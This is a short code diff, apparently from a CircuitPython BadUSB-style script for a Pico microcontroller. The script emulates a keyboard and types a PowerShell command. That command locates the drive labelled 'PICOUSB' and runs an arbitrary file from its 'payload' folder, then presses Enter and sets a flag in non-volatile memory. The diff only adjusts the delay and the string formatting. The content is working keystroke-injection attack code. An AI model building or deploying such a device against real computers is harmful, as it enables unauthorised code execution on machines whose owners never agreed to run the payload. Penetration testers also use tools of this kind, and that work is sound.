@@ -48,12 +48,11 @@ def execute_command(function, command):
         time.sleep(0.1)
         volume_label = "PICOUSB"
         powershell_cmd = (
-            'powershell -NoExit -Command "Start-Sleep 10; '
-            'Get-Volume | Where-Object {$_.FileSystemLabel -eq \'' + volume_label + '\'} | '
-            'ForEach-Object {Start-Process \"$($_.DriveLetter):\\payload\\' + command + '\"}"'
+                'powershell -NoExit -Command "Start-Sleep 3; '
+                'Get-Volume | Where-Object { $_.FileSystemLabel -eq \'' + volume_label + '\' } | '
+                'ForEach-Object { Start-Process (\'{0}:\\payload\\' + command + '\' -f $_.DriveLetter) }"'
         )
         layout.write(powershell_cmd)
-        time.sleep(3)
         kb.send(Keycode.ENTER)
         time.sleep(0.1)
         microcontroller.nvm[0] = 1
